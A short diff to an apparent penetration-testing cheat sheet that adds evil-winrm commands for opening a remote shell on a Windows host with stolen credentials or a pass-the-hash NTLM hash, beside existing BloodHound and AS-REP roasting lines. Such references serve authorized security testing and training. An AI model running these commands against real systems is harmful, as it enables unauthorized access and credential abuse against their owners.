@@ -280,3 +280,9 @@ bloodhound-python -u <USER>@<DOMAIN> -p '<PASSWORD>' -d <DOMAIN> -ns <NAMESERVER
 
 # post-exploitation - active directory - AS-REP roasting - checking for no preauth
 impacket-GetNPUsers -usersfile <USERS> -request -format john -dc-ip <DC IP> <DOMAIN>/ 
+
+# maintaining access - persistence - get a shell with evil-winrm after getting creds
+evil-winrm -i <IP> -u <USER> -p <PASSWORD>
+
+# maintaining access - persistence - get a shell with evil-winrm after getting a hash
+evil-winrm -i <IP> -u <USER> -H <HASH>
